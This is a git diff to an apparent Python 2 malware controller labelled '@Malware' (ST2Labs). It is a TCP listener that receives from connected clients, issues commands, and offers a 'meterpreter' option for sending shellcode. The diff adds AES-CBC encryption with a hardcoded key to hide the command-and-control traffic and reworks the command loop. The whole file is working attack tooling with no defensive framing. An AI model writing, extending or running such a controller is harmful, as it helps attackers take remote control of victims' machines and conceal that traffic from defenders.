@@ -1,3 +1,4 @@
+#!/usr/bin/env python
 """
     @Malware
     ST2Labs / GEO SYSTEM SOFTWARE
@@ -11,6 +12,34 @@ import sys
 import base64
 import socket
 import os
+import re
+from Crypto.Cipher import AES
+from Crypto import Random
+
+#Crypt Class
+class AESCipher:
+
+    def __init__(self, key, blk_sz):
+        self.key = key
+        self.blk_sz = blk_sz
+
+    def encrypt( self, raw ):
+        if raw is None or len(raw) == 0:
+            return ''
+        raw = raw + '\0' * (self.blk_sz - len(raw) % self.blk_sz)
+        iv = Random.new().read( AES.block_size )
+        cipher = AES.new( self.key, AES.MODE_CBC, iv )
+        return base64.b64encode( iv + cipher.encrypt( raw ) )
+
+    def decrypt( self, enc ):
+        if enc is None or len(enc) == 0:
+            return ''
+        enc = base64.b64decode(enc)
+        iv = enc[:16]
+        cipher = AES.new(self.key, AES.MODE_CBC, iv )
+        return re.sub('\0*$','', cipher.decrypt( enc[16:]))
+
+
 
 #Method Hack
 def meterpreter() :
@@ -45,16 +74,36 @@ def decode(data):
         req_str = base64.b64decode(data)
     return req_str
 
+# Set handler connection, option sents data with Cipher+Base64
+def option(con, aes, cmd):
+    encrypt_msg = aes.encrypt(cmd); #Cipher with AES256
+    con.send(base64.b64encode(encrypt_msg)) #Encode msg
+    data = con.recv(8192) #Get data
+    req_str = decode(data) #Decode msg
+    msg = aes.decrypt( req_str ); #DeCipher with AES256
+    return msg
 
-def option(con, cmd):
-
-    con.send(base64.b64encode(cmd))
-    data = con.recv(8192)
-    req_str = decode(data)
-    return req_str
+# Decode Cipher+Base64 data
+def decodeCipher(aes, data):
+    if len(data) % 4 != 0:  # check if multiple of 4
+        while len(data) % 4 != 0:
+            data = data + "="
+        req_str = base64.b64decode(data)
+    else:
+        req_str = base64.b64decode(data)
+    msg = aes.decrypt( req_str ) 
+    return msg
+ 
+ 
+# Encode Cipher+Base64 data
+def encodeCipher(aes, data):
+    encryp_msg = aes.encrypt(data)
+    return base64.b64encode(encryp_msg)
 
 
 def main():
+    #CipherAES Object
+    aes = AESCipher( 'enf1JTGj1qjWaJD3agH2yyYnviHM05YGVLP852UkO0wwHw0Fa0'[:16], 32) #50 Characs
     # Create a TCP/IP socket
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -75,7 +124,7 @@ def main():
         try:
             print >>sys.stderr, '   - Client connected:', client_address
             data = con.recv(4096) #Set to 4096 the buffer command, to allow send shellcode
-            data = decode(data)
+            data = decodeCipher(aes, data)
             print '   {}'.format(data)
             print >>sys.stderr, ''
             while True:
@@ -84,17 +133,20 @@ def main():
                     if code == "1" and cmd == "meterpreter":
                         cmd = meterpreter()
                         code = "0"
+                        req_str = option(con, aes, cmd)
+                        print >>sys.stderr, ''
+                        print >>sys.stderr, '%s' % req_str
+                        print >>sys.stderr, ''
                         break
                     if code == "1":
-                        cmd = "Error"
-                    req_str = option(con, cmd)
+                        cmd = "error"
+                        code = "0"
+                    if cmd == 'hack':
+                        code = "1"
+                    req_str = option(con, aes, cmd)
                     print >>sys.stderr, ''
                     print >>sys.stderr, '%s' % req_str
                     print >>sys.stderr, ''
-                    if code == "1":
-                        break
-                    if cmd == 'hack':
-                        code = "1"
                     if cmd == "quit":
                         break
         except KeyboardInterrupt:
